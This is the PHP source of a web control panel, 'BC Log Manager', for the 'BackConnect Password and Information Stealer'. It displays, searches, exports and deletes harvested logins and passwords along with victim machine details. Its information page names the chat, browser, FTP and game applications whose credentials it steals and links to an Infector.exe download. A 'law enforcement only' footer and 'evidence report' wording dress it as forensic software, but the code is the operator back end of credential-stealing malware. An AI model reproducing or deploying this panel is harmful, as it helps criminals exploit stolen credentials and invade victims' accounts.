<?php

  include 'config.php';

	// ********************************************************************************************

	$html       = "<html><head><title>BC Log Manager - ";
	$header     = "</title><link rel='stylesheet' type='text/css' href='style.css'/></head><body>
				<div id='web'><div id='header'><b>Jak se máš ".$username."?</b></div><div id='navigation'><ul>
				<li><a href='?action=logs'>All Logs</a></li><li><a href='?action=search'>Search</a></li>
				<li><a href='?action=suspects'>Suspects</a></li>
				<li><a href='?action=export'>Export</a></li>
				<li><a href='?action=info'>Information</a></li>
				<li><a href='?action=logout'>Logout</a></li>
				</ul></div><br>";
	$footer     = "<div id='footer'>(C) 2010 - FOR LAW ENFORCEMENTS ONLY. United States law applies.</div></div></body></html>";
	$searchform = "<form name='search' method='POST' action='?action=search'>
				Search for: <input type='text' name='q' size='20' value='".htmlspecialchars($_POST["q"])."'> In: <select name='in'>
				<option value='1' selected='selected'>Url</option><option value='2'>Username</option>
				<option value='3'>Password</option><option value='4'>Computer ID</option>
				<option value='5'>Date</option><option value='6'>IP</option></select>
				<input type='submit' value='Search' name='search'></form>";
	$exportform1 = "<form name='search' method='POST' action='?action=export'><select name='in'>";
	$exportform2 = "</select> <input type='submit' value='Export' name='Export'></form>";
	$loginform  = "<form id='loginform' name='frm' method='POST' action='?action=login'>
				<table id='logintable' cellpadding='2' cellspacing='0' border='0'>
				<tr><td>Username:</td><td><input type='text' name='username' size='20'></td></tr>
				<tr><td>Password:</td><td><input type='password' name='password' size='20'></td></tr>
				<tr><td></td><td><input type='submit' value='Login' name='login'></td></tr></form>";
	$javascript  = "<script language='javascript' type='text/javascript'>
				function CheckElements1() { chk = document.getElementsByName('sel1[]');
				  for (i = 0; i<chk.length; i++) { if (document.frm.elements['check_sel1'].checked) chk[i].checked = true; else chk[i].checked = false;}}
				function CheckElements2() { chk = document.getElementsByName('sel2[]');
				  for (i = 0; i<chk.length; i++) { if (document.frm.elements['check_sel2'].checked) chk[i].checked = true; else chk[i].checked = false;}}
				function ConfirmElements1() { chk = document.getElementsByName('sel1[]');
				  for (i = 0; i<chk.length; i++) { if (chk[i].checked == true) { return confirm('Are you sure you want to delete all selected logs?');}}
				  alert('At least one option must be select.'); return false;}
				function ConfirmElements2() { chk = document.getElementsByName('sel2[]');
				  for (i = 0; i<chk.length; i++) { if (chk[i].checked == true) { return confirm('Are you sure you want to delete all selected logs?');}}
				  alert('At least one option must be select.'); return false;}
				function ConfirmElements12() {
				  chk1 = document.getElementsByName('sel1[]');
				  chk2 = document.getElementsByName('sel2[]');
				  for (i = 0; i<chk1.length; i++) { if (chk1[i].checked == true) { return confirm('Are you sure you want to delete all selected logs?'); }}
				  for (i = 0; i<chk2.length; i++) { if (chk2[i].checked == true) { return confirm('Are you sure you want to delete all selected logs?'); }}
				  alert('At least one option must be select.'); return false;
				}
				function ConfirmElements12Evidence() {
				  chk1 = document.getElementsByName('sel1[]');
				  chk2 = document.getElementsByName('sel2[]');
				  for (i = 0; i<chk1.length; i++) { if (chk1[i].checked == true) { return true; }}
				  for (i = 0; i<chk2.length; i++) { if (chk2[i].checked == true) { return true; }}
				  alert('At least one option must be select.'); return false;
				}
				</script>";
	$cols        = array("program", "url", "login", "pass", "compid", "date", "ip");
	$cols2       = array("compid", "os", "computer", "user", "install", "date", "ip", "country");

	// FUNCTIONS ******************************************************************************
	function connect_database() {
		global $dbHost, $dbUser, $dbPass, $dbDatabase, $html, $header, $footer;
		$mysql = mysql_connect($dbHost, $dbUser, $dbPass);
		if (!$mysql) {
			$html .= "Database Error".$header."Can not connect to database, please check the configuration.".$footer;
			die($html);
		}
		if (!mysql_select_db($dbDatabase, $mysql)) {
			mysql_close($mysql);
			$html .= "Database Error".$header."Can not select '".$dbDatabase."' database, please check the configuration.".$footer;
			die($html);
		}
		return $mysql;
	}
	function pages_number($logstotal, $logspage, $page, $site) {
		$pagesnumber = ceil($logstotal/$logspage);
		$temp = "Pages: ";
		for ($i=0; $i<$pagesnumber; $i++) {
			if ($_SESSION[$page] == $i)
				$temp .= " <span class='page1'>".$i."</span>";
			else
				$temp .= " <span class='page0'><a href='?action=".$site."&".$page."=".$i."'>".$i."</a></span>";
		}
		$temp .= " Results ".($_SESSION[$page]*$logspage)." - ".(($_SESSION[$page]*$logspage)+$logspage)." of about ".$logstotal;
		return $temp;
	}
	function sort_order() {
		if ($_SESSION["order"] == 0) $tmp = "ASC"; else $tmp = "DESC";
			return $tmp;
	}

	// LOGIN **************************************************************************************
	session_start();
	if ($_SESSION["user"]!=$username || $_SESSION["ip"]!=$_SERVER["REMOTE_ADDR"]) {
		if ($_GET["action"] == "login") {
			if (isset($_POST["username"]) && isset($_POST["password"]) && $username==$_POST["username"] && $password==$_POST["password"]) {
				session_start();
				$_SESSION["user"] = $username;
				$_SESSION["ip"] = $_SERVER["REMOTE_ADDR"];
				$_SESSION["sort"] = 5;
				$_SESSION["sort2"] = 5;
				$_SESSION["order"] = 1;
				$_SESSION["page"] = 0;
				$_SESSION["page2"] = 0;
				
				$mysql = connect_database();
				$result = mysql_query("SELECT COUNT(*) FROM `logs`;", $mysql);
				if (!$result) {
					$html .= "Database Error".$header."Table 'logs' not present, please run the installation script first.".$footer;
					die($html);
				}
				$result = mysql_query("SELECT COUNT(*) FROM `suspects`;", $mysql);
				if (!$result) {
					$html .= "Database Error".$header."Table 'suspects' not present, please run the installation script first.".$footer;
					die($html);
				}
				mysql_close($mysql);
				header("Location: ?action=logs");
			} else {
				$html = "<html><head><title>Login Error</title><link rel='stylesheet' type='text/css' href='style.css'/></head><body>".$loginform."</body></html>";
				echo $html;
				exit;
			}
		} else {
			$html = "<html><head><title>Login</title><link rel='stylesheet' type='text/css' href='style.css'/></head><body>".$loginform."</body></html>";
			echo $html;
			exit;
		}
	}

	// LOGOUT ************************************************************************************
	if ($_GET["action"] == "logout") {
		unset($_SESSION["user"]);
		unset($_SESSION["ip"]);
		unset($_SESSION["sort"]);
		unset($_SESSION["sort2"]);
		unset($_SESSION["order"]);
		unset($_SESSION["page"]);
		unset($_SESSION["page2"]);
		session_unset();
		header("Location: index.php");

	// LOGS **************************************************************************************
	} elseif ($_GET["action"] == "logs" || !isset($_GET["action"])) {
	
		if (isset($_GET["sort"]) && $_GET["sort"]>=0 && $_GET["sort"]<=6) {
			if ($_SESSION["sort"] == $_GET["sort"])
				if ($_SESSION["order"] == 0) $_SESSION["order"] = 1; else $_SESSION["order"] = 0; else $_SESSION["sort"] = $_GET["sort"];
		}

		$mysql = connect_database();
		$result = mysql_query("SELECT COUNT(*) FROM `logs` WHERE `program` != 14 ;", $mysql);
		$logstotal = mysql_result($result, 0);
		if ($logstotal > 0) {
			if (isset($_GET["page"]) && is_numeric($_GET["page"]) && $_GET["page"]>=0 && $_GET["page"]<=ceil($logstotal/$logspage))
				$_SESSION["page"] = $_GET["page"];
			
			$result = mysql_query("SELECT * FROM `logs` WHERE `program` != 14 ORDER BY `".$cols[$_SESSION["sort"]]."` ".sort_order()." LIMIT ".($logspage*$_SESSION["page"])." , ".$logspage.";", $mysql);
			if (!$result) die(mysql_error());
			
			$html .= "Logs".$header.$javascript."
					<form name='frm' method='POST' action='?action=selected'>
					<table id='logstable' cellpadding='2' cellspacing='0' border='0'><tr id='row0'>
					<td><a href='?action=logs&sort=0'>Program</a></td><td><a href='?action=logs&sort=1'>Url</a></td>
					<td><a href='?action=logs&sort=2'>Username</a></td><td><a href='?action=logs&sort=3'>Password</a></td>
					<td><a href='?action=logs&sort=4'>Computer ID</a></td><td><a href='?action=logs&sort=5'>Date</a></td>
					<td><a href='?action=logs&sort=6'>IP</a></td>
					<td><input type='checkbox' name='check_sel1' onClick='CheckElements1();'></td></tr>";
			$i = 0;
			while ($row = mysql_fetch_array($result)) {
			  if ($row["program"] != 14) {  // dont display key info here
  				$html .= "<tr class='";
  				if ($i % 2 == 0) $html .= "row1"; else $html .= "row2";
  				$html .= "'><td>".$aplications[$row["program"]]."</td>";
  				$html .= "<td><a href='".$row["url"]."' target='_blanc'>".$row["url"]."</a></td><td>".$row["login"]."</td><td>".$row["pass"]."</td>";
  				$html .= "<td><a href='?action=search&q=".$row["compid"]."'>".$row["compid"]."</a></td><td>".$row["date"]."</td><td>".$row["ip"]."</td>";
  				$html .= "<td><input type='checkbox' name='sel1[]' value='".$row["id"]."'></td></tr>";
				  $i++;
				}
			}
			$html .= "</table><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage, "page", "logs").
			  "</div><input id='delete' name='buttonact' type='submit' value='Delete Selected' onclick='if (!ConfirmElements1()) return false;'></div></form>".$footer;
		} else {
			$html .= "Logs".$header."No logs found!".$footer;
		}
		mysql_close($mysql);
		echo $html;

	// SEARCH ************************************************************************************
	} elseif ($_GET["action"] == "search") {
	  Search:
	  if (isset($_GET["q"])) { $_POST["q"] = $_GET["q"]; $_POST["in"] = 4; /* for suspect-search link */ }
		if (isset($_POST["q"]) && isset($_POST["in"]) && is_numeric($_POST["in"]) && $_POST["in"]>0 && $_POST["in"]<=6) {
			$mysql = connect_database();
			
			// list detailed info of suspect (if comp-id is given)
			if ($_POST["in"] == 4)
			{
  			$result1 = mysql_query("SELECT * FROM `logs` WHERE `".mysql_real_escape_string($cols[$_POST["in"]], $mysql)."` = '".mysql_real_escape_string($_POST["q"], $mysql)."';", $mysql);
			  $result2 = mysql_query("SELECT * FROM `suspects` WHERE ".mysql_real_escape_string($cols[$_POST["in"]], $mysql)." = '".mysql_real_escape_string($_POST["q"], $mysql)."' ORDER BY date ASC;", $mysql);
        if (!$result1 || !$result2) die(mysql_error());
        if (mysql_num_rows($result1) == 0 && mysql_num_rows($result2) == 0)
        {
          $html .= "Search".$header.$searchform."<br>No results found!";
          die($html);
        }
			}
			
			// otherwise normal search in logs table
			else
			{
  			$result1 = mysql_query("SELECT * FROM `logs` WHERE `".mysql_real_escape_string($cols[$_POST["in"]], $mysql)."` LIKE '%".mysql_real_escape_string($_POST["q"], $mysql)."%';", $mysql);
        if (!$result1) die(mysql_error());
        if (mysql_num_rows($result1) == 0)
        {
          $html .= "Search".$header.$searchform."<br>No results found!";
          die($html);
        }
			}

			$html .= "Search".$header.$javascript.$searchform."<form name='frm' method='POST' action='?action=selected'>";

      // display the suspects table
			if ($_POST["in"] == 4 && mysql_num_rows($result2) > 0) {
				$html .= "
					<table id='searchtable' cellpadding='2' cellspacing='0' border='0'><tr id='row0'>
					<td>Computer ID</td><td>OS</td>
					<td>Computer</td><td>User</td>
					<td>Installation</td><td>Date</td>
					<td>IP</td><td>Country</td>
					<td><input type='checkbox' name='check_sel2' onClick='CheckElements2();'>".
					"<input type='hidden' name='in' value='".htmlspecialchars($_POST["in"])."'>".
					"<input type='hidden' name='q' value='".htmlspecialchars($_POST["q"])."'>".
					"</td></tr>";
				$i = 0;
  			while ($row = mysql_fetch_array($result2)) {
  				$html .= "<tr class='";
  				if ($i % 2 == 0) $html .= "row1"; else $html .= "row2";
  				$html .= "'><td>".$row["compid"]."</td><td>".$row["os"]."</td><td>".$row["computer"]."</td><td>".$row["user"]."</td>";
          $html .= "<td>".$installation[$row["install"]]."</td><td>".$row["date"]."</td><td>".$row["ip"]."</td><td>".$row["country"]."</td>";
  				$html .= "<td><input type='checkbox' name='sel2[]' value='".$row["id"]."'></td></tr>";
  				$i++;
  			}
				$html .= "</table><br>";
			}

      // display the log table
			if (mysql_num_rows($result1) > 0) {
				$html .= "
					<table id='searchtable' cellpadding='2' cellspacing='0' border='0'><tr id='row0'>
					<td>Program</td><td>Url</td>
					<td>Username</td><td>Password</td>
					<td>Computer ID</td><td>Date</td>
					<td>IP</td>
					<td><input type='checkbox' name='check_sel1' onClick='CheckElements1();'>".
					"<input type='hidden' name='in' value='".htmlspecialchars($_POST["in"])."'>".
					"<input type='hidden' name='q' value='".htmlspecialchars($_POST["q"])."'>".
					"</td></tr>";
				$i = 0;
				while ($row = mysql_fetch_array($result1)) {
					$html .= "<tr class='";
					if ($i % 2 == 0) $html .= "row1"; else $html .= "row2";
					$html .= "'><td>".$aplications[$row["program"]]."</td>";
					$html .= "<td><a href='".$row["url"]."' target='_blanc'>".$row["url"]."</a></td><td>".$row["login"]."</td><td>".$row["pass"]."</td>";
					$html .= "<td>".$row["compid"]."</td><td>".$row["date"]."</td><td>".$row["ip"]."</td>";
					$html .= "<td><input type='checkbox' name='sel1[]' value='".$row["id"]."'></td></tr>";
					$i++;
				}
				$html .= "</table>";
			}

      // page numbers and delete button
      $html .= "<div id='pages'><div id='numbers'>".mysql_num_rows($result1)." results for '".$_POST["q"]."'</div><div id='delete'>".
        "<input name='buttonact' type='submit' value='Export Evidence' onclick='if (!ConfirmElements12Evidence()) return false;'>&nbsp;".
        "<input name='buttonact' type='submit' value='Delete Selected' onclick='if (!ConfirmElements12()) return false;'>".
        "</div></div></form>";

      $html .= $footer;
			mysql_close($mysql);
		} else {
			$html .= "Logs".$header.$searchform.$footer;
		}
		echo $html;

	// SELECTED **************************************************************************************
	} elseif ($_GET["action"] == "selected") {
		if (isset($_POST["buttonact"])) {

			// DELETE SELECTED ***********************************************************************
			if ($_POST["buttonact"] == "Delete Selected") {
			  
			  // delete entries from logs table (selection 1)
    		if (isset($_POST["sel1"]) && count($_POST["sel1"])!=0) {
  				$mysql = connect_database();
  				$query = "DELETE FROM `logs` WHERE";
  				for ($i=0; $i<count($_POST["sel1"]); $i++) {
  					if (is_numeric($_POST["sel1"][$i]))
  						$query .= " `id` = ".mysql_real_escape_string($_POST["sel1"][$i], $mysql)." OR";
  				}
  				$query .= ';';
  				$query = str_replace(' OR;', ';', $query);
  				$result = mysql_query($query, $mysql);
  				if (!$result) die(mysql_error());
  				mysql_close($mysql);
  			}
  				
  			// delete entries from suspects table (selection 2)
    		if (isset($_POST["sel2"]) && count($_POST["sel2"])!=0) {
  				$mysql = connect_database();
  				$query = "DELETE FROM `suspects` WHERE";
  				for ($i=0; $i<count($_POST["sel2"]); $i++) {
  					if (is_numeric($_POST["sel2"][$i]))
  						$query .= " `id` = ".mysql_real_escape_string($_POST["sel2"][$i], $mysql)." OR";
  				}
  				$query .= ';';
  				$query = str_replace(' OR;', ';', $query);
  				$result = mysql_query($query, $mysql);
  				if (!$result) die(mysql_error());
  				mysql_close($mysql);
  			}

    		if (isset($_POST["q"]) && isset($_POST["in"]))   // return to search, suspects or logs
//    		  header("Location: ?action=search");
          goto Search; // fix me
    		elseif (isset($_POST["sel2"]) && count($_POST["sel2"])!=0)
    		  header("Location: ?action=suspects");
    		else
    		  header("Location: ?action=logs");

			// EXPORT SELECTED ***********************************************************************
			} elseif ($_POST["buttonact"] == "Export Evidence" && isset($_POST["q"])) {
				header("Content-Type: text/plain");
				header("Content-Disposition: Attachment; filename=evidence ".$_POST["q"].".txt");
				header("Pragma: no-cache");
				
				echo "\r\n  BackConnect Password and Information Stealer\r\n  Evidence Report\r\n ================================================\r\n";
				
				// logs table
    		if (isset($_POST["sel1"]) && count($_POST["sel1"])!=0) {
  				$mysql = connect_database();
  				$query = "SELECT * FROM `logs` WHERE";
  				for ($i=0; $i<count($_POST["sel1"]); $i++) {
  					if (is_numeric($_POST["sel1"][$i]))
  						$query .= " `id` = ".$_POST["sel1"][$i]." OR";
  				}
  				$query .= ';';
  				$query = str_replace(' OR;', ';', $query);
  				$result = mysql_query($query, $mysql);
  				if (!$result) die(mysql_error());
  				echo "\r\n\r\n";
  				while ($row = mysql_fetch_array($result)) {
  					echo "Program:      ".$aplications[$row['program']]."\r\n";
  					echo "Url/Host:     ".$row['url']."\r\n";
  					echo "Login:        ".$row['login']."\r\n";
  					echo "Password:     ".$row['pass']."\r\n";
  					echo "Computer ID:  ".$row['compid']."\r\n";
  					echo "Date:         ".$row['date']."\r\n";
  					echo "IP:           ".$row['ip']."\r\n";
  					echo "----------------------------------------------------------\r\n";
  				}
  				mysql_close($mysql);
  			}
				
				// suspects table
    		if (isset($_POST["sel2"]) && count($_POST["sel2"])!=0) {
  				$mysql = connect_database();
  				$query = "SELECT * FROM `suspects` WHERE";
  				for ($i=0; $i<count($_POST["sel2"]); $i++) {
  					if (is_numeric($_POST["sel2"][$i]))
  						$query .= " `id` = ".$_POST["sel2"][$i]." OR";
  				}
  				$query .= ';';
  				$query = str_replace(' OR;', ';', $query);
  				$result = mysql_query($query, $mysql);
  				if (!$result) die(mysql_error());
  				echo "\r\n\r\n";
  				while ($row = mysql_fetch_array($result)) {
  					echo "Computer ID:  ".$row['compid']."\r\n";
  					echo "OS:           ".$row['os']."\r\n";
  					echo "Computer:     ".$row['computer']."\r\n";
  					echo "User:         ".$row['user']."\r\n";
  					echo "Installation: ".$installation[$row["install"]]."\r\n";
  					echo "Date:         ".$row['date']."\r\n";
  					echo "IP:           ".$row['ip']."\r\n";
  					echo "Country:      ".$row['country']."\r\n";
  					echo "Host:         ".$row['host']."\r\n";
  					echo "----------------------------------------------------------\r\n";
  				}
  				mysql_close($mysql);
  			}

			}

		}

	// SUSPECTS **********************************************************************************
	} elseif ($_GET["action"] == "suspects") {
	
		if (isset($_GET["sort"]) && $_GET["sort"]>=0 && $_GET["sort"]<=7) {
			if ($_SESSION["sort2"] == $_GET["sort"])
				if ($_SESSION["order"] == 0) $_SESSION["order"] = 1; else $_SESSION["order"] = 0; else $_SESSION["sort2"] = $_GET["sort"];
		}

		$mysql = connect_database();
		$result = mysql_query("SELECT COUNT(*) FROM suspects WHERE install <> ".$InstallCodeRestart.";", $mysql);
		$logstotal = mysql_result($result, 0);
		if ($logstotal > 0) {
			if (isset($_GET["page2"]) && is_numeric($_GET["page2"]) && $_GET["page2"]>=0 && $_GET["page2"]<=ceil($logstotal/$logspage))
				$_SESSION["page2"] = $_GET["page2"];
			
			$result = mysql_query("SELECT * FROM suspects WHERE install <> ".$InstallCodeRestart." ORDER BY ".$cols2[$_SESSION["sort2"]]." ".sort_order()." LIMIT ".($logspage*$_SESSION["page2"])." , ".$logspage.";", $mysql);
			if (!$result) die(mysql_error());
			
			$html .= "Suspects".$header.$javascript."
					<form name='frm' method='POST' action='?action=selected'>
					<table id='logstable' cellpadding='2' cellspacing='0' border='0'><tr id='row0'>
					<td><a href='?action=suspects&sort=0'>Computer ID</a></td><td><a href='?action=suspects&sort=1'>OS</a></td>
					<td><a href='?action=suspects&sort=2'>Computer</a></td><td><a href='?action=suspects&sort=3'>User</a></td>
					<td><a href='?action=suspects&sort=4'>Installation</a></td><td><a href='?action=suspects&sort=5'>Date</a></td>
					<td><a href='?action=suspects&sort=6'>IP</a></td><td><a href='?action=suspects&sort=7'>Country</a></td>
					<td><input type='checkbox' name='check_sel2' onClick='CheckElements2();'></td></tr>";
			$i = 0;
			while ($row = mysql_fetch_array($result)) {
				$html .= "<tr class='";
				if ($i % 2 == 0) $html .= "row1"; else $html .= "row2";
				$html .= "'><td><a href='?action=search&q=".$row["compid"]."'>".$row["compid"]."</a></td><td>".$row["os"]."</td><td>".$row["computer"]."</td><td>".$row["user"]."</td>";
        $html .= "<td>".$installation[$row["install"]]."</td><td>".$row["date"]."</td><td>".$row["ip"]."</td><td>".$row["country"]."</td>";
				$html .= "<td><input type='checkbox' name='sel2[]' value='".$row["id"]."'></td></tr>";
				$i++;
			}
			$html .= "</table><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage, "page2", "suspects")."</div>".
			  "<input id='delete' name='buttonact' type='submit' value='Delete Selected' onclick='if (!ConfirmElements2()) return false;'></div></form>".$footer;
		} else {
			$html .= "Suspects".$header."No suspects found!".$footer;
		}
		mysql_close($mysql);
		echo $html;

	// EXPORT ************************************************************************************
	} elseif ($_GET["action"] == "export") {

		if (isset($_POST["in"]) && is_numeric($_POST["in"]) && $_POST["in"] < $ApplicationCount) {
				$mysql = connect_database();
				$query = "SELECT * FROM `logs` WHERE `program` =".mysql_real_escape_string($_POST["in"], $mysql).";";
				$result = mysql_query($query, $mysql);
				if (!$result) die(mysql_error());
				header("Content-Type: text/plain");
				header("Content-Disposition: Attachment; filename=log ".$aplications[$_POST["in"]].".txt");
				header("Pragma: no-cache");
				while ($row = mysql_fetch_array($result)) {
					echo "Program:      ".$aplications[$row['program']]."\r\n";
					echo "Url/Host:     ".$row['url']."\r\n";
					echo "Login:        ".$row['login']."\r\n";
					echo "Password:     ".$row['pass']."\r\n";
					echo "Computer ID:  ".$row['compid']."\r\n";
					echo "Date:         ".$row['date']."\r\n";
					echo "IP:           ".$row['ip']."\r\n";
					echo "----------------------------------------------------------\r\n";
				}
				mysql_close($mysql);
			$mysql = connect_database();

			mysql_close($mysql);
		} else {
      for ($i = 0; $i < $ApplicationCount; $i++)
        $exportform1 .= "<option value='".$i."'>".$aplications[$i]."</option>";
  		$html .= "Logs".$header.$exportform1.$exportform2.$footer;
  		echo $html;
		}

	// INFORMATION **********************************************************************************
	} elseif ($_GET["action"] == "info") {
	
		$html .= "Information".$header;
		$html .= "Version: 1.2<br>Date: 28.10.2010<br><br>This is BackConnect. ".
		         "For any questions and upgrades, please contact -. This copy is registered to: - Click on a computer id to show the complete collected evidence.<br><br>".
		         "It steals following information:<br>* MSN<br>* Google Talk<br>* Trillian<br>* Pidgin<br>".
		         "* Paltalk<br>* Steam<br>* No-IP<br>* DynDNS<br>* Firefox (all versions)<br>* Internet Explorer (unreliable)<br>".
		         "* FileZilla<br>* FlashFXP<br>* Keys from various games and software<br>* Outlook (old versions)<br>* IMVU<br>* Internet Download Manager<br>* Chrome (< 2010)".
		         "<br>* RapidShare Downloader<br>* SmartFTP<br>* CoreFTP<br>* FTP Commander<br><br>".
		         "For further information and legal information please read the readme.<br><br>".
		         "<a href='/downloads/Infector.exe'>Link to your Infector.exe</a><br><a href='/downloads/Disinfector.exe'>Link to your Disinfector.exe</a><br><br>";
		$html .= $footer;
		echo $html;

	// Unknown ***********************************************************************************
	} else {
		$html .= $header.$footer;
		echo $html;
	}
?>